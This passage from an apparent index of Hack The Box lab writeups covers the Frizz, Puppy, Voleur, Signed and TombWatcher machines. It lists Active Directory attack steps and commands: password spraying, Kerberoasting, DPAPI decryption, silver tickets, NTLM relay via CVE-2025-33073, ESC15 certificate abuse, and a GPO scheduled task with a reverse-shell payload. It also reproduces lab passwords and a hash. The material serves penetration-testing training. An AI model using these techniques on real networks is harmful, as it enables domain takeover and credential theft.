- `sudo apt-get install libsasl2-modules-gssapi-mit krb5-user`
- `ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizz.htb`

### Artifacts and exact search anchors

`CVE-2023-45878`, `frizzdc.frizz.htb`, `/etc/hosts`, `frizz.htb`, `CVE-2023-45878.py`, `juuladks.php`, `C:\xampp\htdocs\Gibbon-LMS`, `config.php`, `c:\xampp\mysql\bin\mysql.exe -uMrGibbonsDB pMisterGibbs`, `/usr/share/wordlists/rockyou.txt`, `getTGT.py`, `krb5.conf`, `/etc/krb5.conf`, `C:\Users\f.frizzle`, `C:\Users\f.frizzle\Desktop\user.txt`

Open the PDF around page **1** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Create a GPO and link it to OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB.
- Use SharpGPOAbuse to add a computer scheduled task containing a SYSTEM reverse-shell payload to the controlled GPO.
- Run gpupdate /force and catch the NT AUTHORITY\SYSTEM callback.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate scheduled jobs/tasks plus every referenced script, binary, working directory, and PATH component. Writable dependencies matter even when the task itself is protected.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.

### Root / Administrator path

**Memory chain:** SSH → Kerberos ticket abuse → BloodHound path analysis → cron/scheduled-job abuse → reverse shell

- have three possible users to use this against, but we will try M.Schoolbus since the password reversed is as follows: $ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d | rev R!deTheM@gicBus!
- instruct SharpGPOAbuse to create a scheduled task with a PowerShell payload and apply the GPOs.

#### Commands and PDF search strings

- `ssh -K -o GSSAPIAuthentication=yes m.schoolbus@frizz.htb`
- `wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe`

### Artifacts and exact search anchors

`C:\Users\f.frizzle`, `c:\users`, `C:\$Recycle.bin\S-1-5-`, `C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103`, `C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-29327018131103\$RE2XMEG.7z`, `C:\Users\f.frizzle\Desktop`, `frizz.htb`, `waptserver.ini`, `getTGT.py`, `frizzdc.frizz.htb`, `C:\Users\M.SchoolBus`, `C:\Users\M.SchoolBus\Desktop`, `GPT.ini`, `C:\Windows\system32`, `C:\User\Administrator\Desktop\root.txt`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 36- Puppy

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Puppy.md) · [Official PDF](./htb-writeups/Puppy.pdf)

### Machine path overview

Puppy is a Medium Difficulty machine that features a non-default SMB share called DEV . With the provided credentials for user levi.james , enumeration of the domain is possible. The enumeration reveals that this user has GenericWrite privileges over the Developers group. After adding Levi to this group, we can access the previously inaccessible DEV share. This share contains the backup of a KeePass database, which we can download, export the hash of and crack. The database reveals a plethora of username and password combinations. A password spray attack shows that one of the passwords is valid for user Ant.Edwards . Furthermore, this new user has GenericAll privileges over the user Adam.Silver , which allow us to change their password to a password of our choice. After the password is changed, we must reenable Adam's account, as it has been disabled, which then allows us to connect to the remote system over WinRM. Lateral movement is achieved by finding the backup of a website, which contains credentials for user Steph.cooper . Finally, privileges are escalated through DPAPI credentials that are decrypted using Steph's password. The credentials revealed belong to Steph.cooper_adm , presumably the Administrative account of Steph, and a connection can be made over WinRM.

### Remote enumeration and foothold checks

- With the provided levi.james credential, enumerate SMB and BloodHound; DEV is initially inaccessible even though it is visible.
- BloodHound shows levi.james has GenericWrite over Developers; add the user to that group and re-enumerate DEV.
- Download recovery.kdbx from DEV, extract its hash, crack the KeePass password, and inventory every credential in the database.
- Spray the KeePass passwords to identify Ant.Edwards, then use Ant's GenericAll over Adam.Silver to reset Adam's password and re-enable the disabled account.
- Use Adam.Silver over WinRM for the first interactive foothold.
- If the distro keepass2john reports KeePass file version 40000 unsupported, install/use a current John build (the writeup uses john-the-ripper.keepass2john via snap) and crack with --format=KeePass; the old extractor cannot handle the Argon2/newer database.
- Run `showmount -e`, mount exported NFS paths, inspect UID/GID behavior, and check whether `no_root_squash` or writable content enables escalation.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- For KeePass artifacts, collect the database, dump/config/key material, and test the relevant recovery vulnerability; convert any recovered PuTTY/SSH key into a usable OpenSSH key.

### Post-foothold local enumeration and lateral movement

- Enumerate the root of C: and inspect C:\Backups; download site-backup-2024-12-30.zip.
- Inside the website backup, read nms-auth-config.xml.bak for Steph.Cooper's LDAP bind password.
- Use Steph.Cooper over WinRM and enumerate hidden AppData files, not only Desktop/Documents.

### User path

**Memory chain:** NFS/share abuse → LDAP enumeration → group-membership abuse → SMB enumeration → BloodHound path analysis → ACL abuse → KeePass database recovery → password cracking → WinRM

- try to export the hash of this database with keepass2john and attempt to crack it. $ keepass2john recovery.kdbx ! recovery.kdbx : File version '40000' is currently not supported!
- This is also successful and the password is identified as liverpool . $ john-the-ripper hash.txt --show recovery:liverpool 1 password hash cracked, 0 left Upon unlocking the database we see 5 username and password combinations.
- export the above credentials into a CSV file. $ echo 'liverpool' | keepassxc-cli export -f csv recovery.kdbx > output.csv Enter password to unlock recovery.kdbx: $ cat output.csv "Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created" "Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-0310T08:57:58Z","2025-03-10T08:57:01Z" "Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-0310T08:58:07Z" "Root","ANTONY C.
- EDWARDS","","Antman2025!","puppy.htb","","","0","2025-0310T09:00:02Z","2025-03-10T08:58:46Z" "Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","202503-10T09:01:26Z" "Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-0310T09:02:03Z" Now, let's grab the passwords from the CSV and place them into a file called passwords.txt .
- download it locally. *Evil-WinRM* PS C:\Backups> download "C:/Backups/site-backup-2024-12-30.zip" Info: Downloading C:/Backups/site-backup-2024-12-30.zip to site-backup-2024-12-30.zip Info: Download successful!

#### Commands and PDF search strings

- `nmap -Pn -A -v 10.129.81.186`
- `netexec smb puppy.htb -u levi.james -p KingofAkron2025! --shares`
- `netexec smb puppy.htb -u levi.james -p KingofAkron2025! --shares READ`
- `netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --rid-brute | grep -iE`
- `smbclient \\\\puppy.htb\\DEV -U levi.james`
- `sudo snap install john-the-ripper`
- `netexec smb puppy.htb -u usernames.txt -p passwords.txt --continue-on-success`
- `netexec smb puppy.htb -u adam.silver -p 'Thisisapassword123!'`
- `evil-winrm -i puppy.htb -u adam.silver -p 'Thisisapassword123!`
- `Evil-WinRM shell v3.7`
- `evil-winrm -i puppy.htb -u steph.cooper -p 'ChefSteph2025!'`

### Artifacts and exact search anchors

`puppy.htb`, `/etc/hosts`, `bloodhound.py`, `dc.puppy.htb`, `20250926152206_bloodhound.zip`, `recovery.kdbx`, `/home/trx/snap/john-the-ripper/694/.john`, `/home/trx/snap/john-the-ripper/694/.john/opencl`, `C:\Users\adam.silver\Documents`, `C:\Users\adam.silver\Desktop`, `C:\Backups`, `site-backup-2024-12-30.zip`, `nms-auth-config.xml.bak`, `C:\Users\steph.cooper\Documents`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Collect the DPAPI credential blob from AppData\Local/Roaming\Microsoft\Credentials and the matching masterkey from AppData\Roaming\Microsoft\Protect\<SID>.
- Preserve binary files during transfer; use Steph's plaintext password and SID with impacket dpapi.py masterkey.
- Decrypt the credential blob with the recovered masterkey to reveal steph.cooper_adm, then authenticate over WinRM.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** DPAPI/browser secrets → WinRM

- The above command reveals the password FivethChipOnItsWay2025! for user steph.cooper_adm .
- The root flag can be found in C:\Users\Administrator\Desktop\ .

#### Commands and PDF search strings

- `evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials and specifically the file called`, `C:\Users\steph.cooper\Documents`, `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials -Force`, `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-18290507832281216199-1107`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\ -Force`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-18290507832281216199-1107 -Force`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-211487982659-1829050783-2281216199-1107`, `/home/trx/Machines/Puppy/puppy.exe`, `C:\Users\steph.cooper\Documents\puppy.exe`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B52`, `/home/trx/Puppy/C`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-521-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-211487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407`, `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-14879826591829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407`, `dpapi.py`, `PUPPY.HTB`, `C:\users\administrator\desktop`, `C:\Users\Administrator\Desktop\`

Open the PDF around page **16** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 37- Voleur

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Voleur.md) · [Official PDF](./htb-writeups/Voleur.pdf)

### Machine path overview

Voleur is a medium-difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment, and NTLM authentication is disabled. After Kerberos configuration and network enumeration, a password-protected Excel file is found on an exposed SMB share. We extract its password hash, crack it to recover the password, and use that password to access the spreadsheet. Enumeration reveals a service account with WriteSPN rights, which enables a targeted Kerberoasting attack that recovers credentials and grants remote access to the host. A previously deleted domain user is restored using group privileges, and a DPAPI-protected credential blob is recovered, which is decrypted with the user’s password to reveal a higher-privilege account. These credentials lead to discovering an SSH private key for a backup service account, allowing access to a Linux subsystem over a nonstandard port. From this, the NTDS.dit , SYSTEM , and SECURITY backup files are extracted and used to recover the Administrator 's NT hash, ultimately allowing access as the Administrator .

### Remote enumeration and foothold checks

- NTLM is disabled: configure DNS, clock, /etc/krb5.conf, and use Kerberos-aware SMB/WinRM tooling with the supplied credential.
- Enumerate the Finance SMB share and download the password-protected Excel workbook; extract/crack its Office hash before reading its data.
- Use the recovered spreadsheet information for AD enumeration and identify WriteSPN over the service account.
- Set a temporary SPN and perform targeted Kerberoasting, crack the ticket, then remove/clean the SPN and use the recovered account for WinRM.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.

### Post-foothold local enumeration and lateral movement

- Use the account's Restore Users/Reanimate Tombstones privilege to locate and restore the deleted user whose SID/name appears in AD.
- After restoring the user, recover the DPAPI credential blob and matching masterkey and decrypt them with that user's password.
- The decrypted higher-privilege credential exposes access to an SSH private key for svc_backup.
- Use the key on the nonstandard SSH port to reach the Linux backup subsystem.

### User path

**Memory chain:** LDAP enumeration → SSH → SMB enumeration → password cracking → configuration-file secrets → BloodHound path analysis → Kerberoasting → Kerberos ticket abuse → WinRM → saved-credential abuse

- So we need to restore the deleted object using the Restore-ADObject cmdlet to recover deleted directory objects from the Active Directory Recycle Bin.
- Use the flag combination --bypassuac and --logon-type '8' to obtain a more privileged token.
- Use the flag combination --bypassuac and --logon-type '8' to obtain a more privileged token.
- To do this, we first decrypt the master key using Impacket’s DPAPI module.
- From the spreadsheet, Jeremy is a third-line support technician and likely has broader access than our current account.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.76`
- `Nmap done: 1 IP address (1 host up) scanned in 128.22 seconds`
- `nxc smb 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt'`
- `nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares`
- `nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --shares -spider IT --regex .`
- `nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --share IT -get-file 'First-Line Support\\Access_Review.xlsx' Access_Review.xlsx`
- `sudo john hash --pot=/tmp/file.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- `bloodhound-python -u 'ryan.naylor' -d 'voleur.htb' -p 'HollowOct31Nyt' -c all --zip -ns`
- `impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76`
- `hashcat whash /usr/share/wordlists/rockyou.txt`
- `hashcat (v6.2.6-1365-g51e47daa1) starting in autodetect mode`
- `impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76`
- `evil-winrm -i dc.voleur.htb -r VOLEUR.HTB`
- `Evil-WinRM shell v3.7`
- `impacket-getTGT voleur.htb/todd.wolfe -dc-ip 10.10.11.76`
- `nxc smb dc.voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -d VOLEUR.htb -k --shares`
- `nxc smb dc.voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -d VOLEUR.htb -k --spider IT -regex .`
- `impacket-smbclient -k todd.wolfe@dc.voleur.htb`
- `impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-213927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14`
- `impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key`
- `impacket-getTGT voleur.htb/jeremy.combs -dc-ip 10.10.11.76`

### Artifacts and exact search anchors

`voleur.htb`, `krb5.conf`, `/etc/hosts`, `DC.voleur.htb`, `/etc/krb5.conf`, `/tmp/file.txt`, `/usr/share/wordlists/rockyou.txt`, `BloodHound.py`, `20251031142342_bloodhound.zip`, `/home/fury/tools/targetedKerberoast/targetedKerberoast.py`, `targetedKerberoast.py`, `C:\Users\svc_winrm\Documents`, `C:\Users\svc_winrm\Desktop\user.txt`, `/home/fury/labs/voleur/writeup/RunasCs.exe`, `C:\Users\svc_winrm\Documents\RunasCs.exe`, `C:\Users\jeremy.combs\Documents`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- On the backup subsystem inspect the backup/Support paths for NTDS.dit, SYSTEM, and SECURITY copies rather than attempting local Linux escalation.
- Extract domain hashes offline with secretsdump using NTDS.dit plus SYSTEM (and SECURITY where relevant).
- Use the recovered Administrator NT hash with Kerberos/WinRM-compatible access to the DC.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** private-key discovery → WinRM → SSH → registry secrets → DCSync/secrets dump → Kerberos ticket abuse

- I've part configured WSL to see if we can utilize any of the backup tools from Linux.
- Thanks, Admin *Evil-WinRM* PS C:\IT\Third-Line Support> The note indicates experiments with backup tooling and WSL .
- Among the extracted credentials, we obtain the NT hash for the Administrator account.
- Using ImpacketgetTGT , we request a Kerberos TGT for the Administrator user.

#### Commands and PDF search strings

- `ssh -i id_rsa svc_backup@10.10.11.76 -p 2222`
- `impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL`
- `impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2`
- `evil-winrm -i dc.voleur.htb -r VOLEUR.HTB`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`C:\IT\Third-Line Support and list the files. There we find`, `C:\IT\Third-Line Support`, `C:\IT\Third-Line Support\id_rsa to id_rsa`, `voleur.htb`, `dc.voleur.htb`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **16** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 38- Signed

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Signed.md) · [Official PDF](./htb-writeups/Signed.pdf)

### Machine path overview

Signed is a medium-difficulty Windows machine that demonstrates the exploitation of an MSSQL server by extracting the NTLMv2 hash of the service account running the instance and cracking the hash to obtain its password. This enables the issuance of silver tickets for user impersonation and service access. The domain is then enumerated via the MSSQL instance to gather the necessary information to impersonate the Administrator account and grant command execution through the MSSQL service. For privilege escalation, the recently discovered CVE-2025-33073, an NTLM reflection attack, is leveraged to perform self-relaying even with signing enforced, providing access to the WinRMS interface.

### Remote enumeration and foothold checks

- Use MSSQL xp_dirtree against an attacker UNC path and Responder to capture the mssqlsvc NetNTLMv2 hash, then crack it.
- Because LDAP, SMB, and Kerberos are not externally reachable, query SUSER_SID('SIGNED\Administrator') inside MSSQL to recover the domain SID.
- Use SUSER_SNAME(domain-SID + candidate RID) to enumerate principals through MSSQL when normal RID/LDAP methods are blocked.
- Derive the mssqlsvc NT hash and forge a silver ticket for the MSSQL SPN while impersonating Administrator.
- Use MSSQL as the impersonated Administrator to grant sysadmin/control and enable xp_cmdshell for a shell as mssqlsvc.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
- Abuse MSSQL `xp_dirtree` for filesystem discovery or forced SMB authentication. Check web roots, backups, configuration files, and UNC paths; it often works without `xp_cmdshell`.
- From MSSQL, query `SUSER_SID('DOMAIN\KnownUser')` to recover a binary SID when LDAP/RPC is blocked. Strip the final RID to obtain the domain SID.

### Post-foothold local enumeration and lateral movement

- Run netstat locally after landing; WinRMS is listening internally even though the external port scan did not expose it.
- Use the local/internal service layout to plan NTLM reflection rather than searching only for conventional local privilege escalation.
- Prepare the special marshaled hostname required by CVE-2025-33073 and register a self-resolving DNS name with krbrelayx dnstool.

### User path

**Memory chain:** database enumeration → password cracking → Kerberos ticket abuse → CVE-2025-33073 → group-membership abuse → NTLM relay/coercion → SMB enumeration → LDAP enumeration → reverse shell

- Signed is a medium-difficulty Windows machine that demonstrates the exploitation of an MSSQL server by extracting the NTLMv2 hash of the service account running the instance and cracking the hash to obtain its password.
- However, we can use the xp_dirtree feature and capture the NTLMv2 hash of the service account that's running this service.
- Since we have the plaintext password for the service account running the MSSQL service, we can create Silver tickets and impersonate any user to access this service.
- Now let's create the NT hash of the mssqlsvc account using pypykatz . $ pypykatz crypto nt 'purPLE9795!@' ef699384c3285c54128a3ee1ddb1a0cc With that, we have everything we need to create the Silver Ticket impersonating the Administrator user.
- In a silver ticket attack, all we do is create the PAC of the ticket with the impersonating user's information and encrypt it with the NT hash of the service account.

#### Commands and PDF search strings

- `nmap -sSVC --open 10.129.242.189 -Pn`
- `sudo responder -I tun0`
- `hashcat mssqlsvc_hash /usr/share/wordlists/rockyou.txt`

### Artifacts and exact search anchors

`CVE-2025-33073`, `SIGNED.HTB`, `DC01.SIGNED.HTB`, `/etc/hosts`, `mssqlclient.py`, `xp_cmdshell`, `xp_dirtree`, `/usr/share/wordlists/rockyou.txt`, `SUSER_SID`, `convert.py`, `ticketer.py`, `C:\Windows\system32`

Open the PDF around page **1** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Run ntlmrelayx targeting WinRMS with the appropriate protocol client while coercing the DC/machine to authenticate to its marshaled self-name.
- CVE-2025-33073 permits self-relay/reflection despite SMB signing; verify both the coercion and successful relayed login before expecting command execution.
- Use the relayed WinRMS context for privileged command execution/Administrator access.
- WinRMS relaying requires Impacket v0.13.0 with the WINRMS protocol client; older ntlmrelayx builds will not support the winrms:// target.
- Run ntlmrelayx through the pivot with -t winrms://<DC> -smb2support; after coercion, HTTP 500 is expected and can still mean a successful relayed login.
- A successful WinRMS relay opens the interactive shell on 127.0.0.1:11000 through the SOCKS path; connect to that local endpoint rather than expecting a normal Evil-WinRM session.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Root / Administrator path

**Memory chain:** SMB enumeration → LDAP enumeration → SSH → database enumeration → group-membership abuse → NTLM relay/coercion → AD CS/certificate abuse → DCSync/secrets dump → WinRM → Kerberos ticket abuse

- To be able to access them from our attacking machine, let's create a SOCKS proxy with chisel .
- This was initially issued as a bug in the NetExec tool, but later found to be a valid issue in the Active Directory service.
- In order to exploit this, we need to add a DNS entry pointing back to us.
- Now we can access the WinRMS shell from the socks proxy at 127.0.0.1:11000 . $ nc 127.0.0.1 11000 Type help for list of commands # whoami nt authority\system The root flag can be found in \users\administrator\desktop\root.txt .
- Beyond Root In the Silver Ticket attack step, it's possible to forge a ticket for the SQL service account mssqlsvc and use that ticket to read the root flag directly from the SQL server.

#### Commands and PDF search strings

- `NetExec 's coerce_plus module. (Subsequently, Petitpotam can also be used for this)`

### Artifacts and exact search anchors

`C:\windows\tasks`, `chisel.sh`, `dc01.signed.htb`, `SIGNED.HTB`, `/etc/proxychains.conf`, `proxychains.conf`, `dnstools.py`, `/opt/krbrelayx/dnstool.py`, `dnstool.py`, `ntlmrelayx.py`, `ticketer.py`, `mssqlclient.py`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 39- TombWatcher

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/TombWatcher.md) · [Official PDF](./htb-writeups/TombWatcher.pdf)

### Machine path overview

TombWatcher is a medium-difficulty Windows machine that focuses on Active Directory privilege escalation through a chained abuse of domain object permissions. The attack starts with the provided credentials for the user henry , who possesses WriteSPN rights over the account alfred. This access is leveraged to carry out a targeted Kerberoasting attack , allowing the alfred user’s password to be cracked and yielding control over an account that can add itself to the INFRASTRUCTURE group. Being a member of this group allows you to retrieve the gMSA password for the ansible_dev$ managed service account. This account has the privilege to reset the password for the user sam , which becomes the next pivot point. Through the sam user, WriteOwner permissions over the user john are abused to obtain a GenericAll ACE, enabling a password reset and full access to the john user, who is a member of the Remote Management Users group. This provides an interactive shell and access to the user flag. Privilege escalation to Administrator is then achieved by abusing john user’s GenericAll rights over the ADCS organizational unit. A previously deleted account, cert_admin , is restored using the Active Directory Recycle Bin , its password is reset, and it is leveraged to exploit ESC15 against a misconfigured WebServer certificate template. This ultimately allows the issuance of a certificate for Administrator, resulting in full domain compromise. allows the issuance of a certificate for Administrator, resulting in full domain compromise.

### Remote enumeration and foothold checks

- Collect BloodHound data with the supplied henry credential and inspect outbound ACL edges rather than attempting password attacks first.
- Abuse henry's WriteSPN over alfred for targeted Kerberoasting, crack alfred's ticket, and clean the temporary SPN.
- Use alfred's right to add itself to INFRASTRUCTURE, then retrieve the ansible_dev$ gMSA managed password/NT hash.
- Use ansible_dev$ to reset sam, then sam's WriteOwner over john to take ownership, grant GenericAll, and reset john's password.
- John is in Remote Management Users, providing the first interactive WinRM shell.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
- If an account/group can read a gMSA password, retrieve `msDS-ManagedPassword`, derive the NT hash, and authenticate as the managed service account.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.

### Post-foothold local enumeration and lateral movement

- BloodHound shows john has GenericAll over the ADCS OU; inspect deleted objects and CA/template configuration from this position.
- Use Active Directory Recycle Bin visibility/control to find and restore the deleted cert_admin account, then reset its password.
- Re-enumerate certificate templates with cert_admin because enrollment/control visibility changes under the restored account.

### User path

**Memory chain:** LDAP enumeration → subdomain enumeration → BloodHound path analysis → Kerberoasting → password cracking → gMSA password retrieval → group-membership abuse → ACL abuse → WinRM

- With an SPN assigned, we can request a Kerberos TGS (Ticket Granting Service) ticket encrypted with alfred 's password hash and attempt to crack it offline.
- Further bloodhound enumeration reveals that members of the INFRASTRUCTURE group can read the gMSA password for the ansible_dev$ account.
- A Group Managed Service Account (gMSA) is a domain account whose password is automatically managed by Active Directory.
- The password is stored in the msDSManagedPassword attribute and is readable only by principals explicitly granted access.
- The WriteOwner permission allows us to change the owner of the john object to sam .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV tombwatcher.htb`
- `bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb -u henry -p`
- `hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt`
- `evil-winrm -i dc01.tombwatcher.htb -u john -p rogue`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`tombwatcher.htb`, `DC01.tombwatcher.htb`, `BloodHound.py`, `20260330122921_bloodhound.zip`, `/opt/tools/targetedKerberoast/targetedKerberoast.py`, `targetedKerberoast.py`, `/usr/share/wordlists/rockyou.txt`, `msDS-ManagedPassword`, `C:\Users\john\Documents`, `C:\Users\john\Desktop\user.txt`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Identify ESC15 on the WebServer template (schema/version and template control matter) and enroll via cert_admin.
- Request a certificate that authenticates as Administrator, then use the PFX for PKINIT/NT-hash retrieval.
- Use the Administrator credential/hash for WinRM and full domain compromise.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → password cracking → ACL abuse → AD CS/certificate abuse → registry secrets → private-key discovery → WinRM → CVE-2024-49019 → group-membership abuse → PFX/certificate-key recovery

- Still, the existence of an OU related to ADCS enables us to identify potential misconfigurations in certificate services.
- In this case, it suggests that a previously existing account may still retain enrollment rights to the certificate template , potentially opening the door to abuse.
- This vulnerability affects certificate templates with Schema Version 1 where the enrollee supplies the subject.
- Because Schema Version 1 templates do not enforce Application Policy constraints, an attacker can inject a Client Authentication application policy into the certificate request.

#### Commands and PDF search strings

- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `impacket-dacledit -action 'write' -rights 'FullControl' -inheritance principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB'`
- `certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip`
- `certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.11.1 -target-ip`
- `certipy auth -dc-ip 10.129.11.1 -pfx administrator.pfx`
- `evil-winrm -i dc01.tombwatcher.htb -u administrator -H`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`dc01.tombwatcher.htb`, `20260330173015_Certipy.zip`, `20260330173015_Certipy.json`, `TOMBWATCHER.HTB`, `C:\Users\john\Documents`, `dacledit-20260330-203936.bak`, `CVE-2024-49019`, `cert_admin.pfx`, `administrator.pfx`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 40- UpDown

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/UpDown.md) · [Official PDF](./htb-writeups/UpDown.pdf)

### Machine path overview

